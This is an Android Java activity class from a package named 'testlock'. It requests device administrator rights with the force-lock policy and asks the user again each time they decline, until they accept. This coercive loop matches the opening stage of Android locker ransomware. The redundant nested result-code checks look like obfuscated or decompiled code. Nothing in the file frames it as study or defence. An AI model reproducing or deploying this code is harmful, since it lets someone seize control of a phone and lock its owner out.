package com.example.testlock;

import com.example.testlock.MainActivity.mainActivity;

import android.app.Activity;
import android.app.admin.DeviceAdminInfo;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.widget.Toast;

public class LowLevel extends Activity {

	public static DevicePolicyManager mDevicePolicyManager;
	public static ComponentName mComponentName;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		mDevicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
		mComponentName = new ComponentName(this, MainActivity.class);

		setDeviceAdmin();
	}

	@Override
	protected void onActivityResult(int requestCode, int resultCode, Intent data) {
		super.onActivityResult(requestCode, resultCode, data);
		if(requestCode != Integer.MAX_VALUE){
			if(requestCode != 0){
				if(requestCode == 228){
					if(resultCode != Integer.MIN_VALUE){
						if(requestCode != 0){
							if(resultCode == Activity.RESULT_OK){
								finish();
								Intent as = new Intent(this, mainActivity.class);
								startActivity(as);
							} else {
								setDeviceAdmin();
							}
						}
					}
				}
			}
		}
	}

	public void setDeviceAdmin() {
		Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
		intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, mComponentName);
		intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "To continue, you must activate the application. Click to activate / enable");
		intent.putExtra("force-locked", DeviceAdminInfo.USES_POLICY_FORCE_LOCK);
		try {
			startActivityForResult(intent, 228);
		} catch (Throwable e) {
			e.printStackTrace();
		}
	}
}
